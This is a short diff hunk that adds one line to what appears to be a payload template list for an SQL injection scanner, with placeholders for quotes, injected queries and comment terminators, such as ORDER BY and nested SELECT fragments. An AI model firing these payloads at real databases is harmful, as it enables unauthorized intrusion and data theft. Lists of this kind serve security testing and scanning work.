@@ -32,6 +32,7 @@ AnD {sqli}{comment}
 {quote} AnD {sqli} ANd {quote}1
 {quote}&&{sqli}&&{quote}1
 {quote}ORDER BY {sqli}
+{quote}ORDER BY {sqli}{comment}
 ORDER BY {sqli}
 ORDER BY {sqli}{comment}
 (SELECT * FROM (SELECT({sqli}))ecMj)
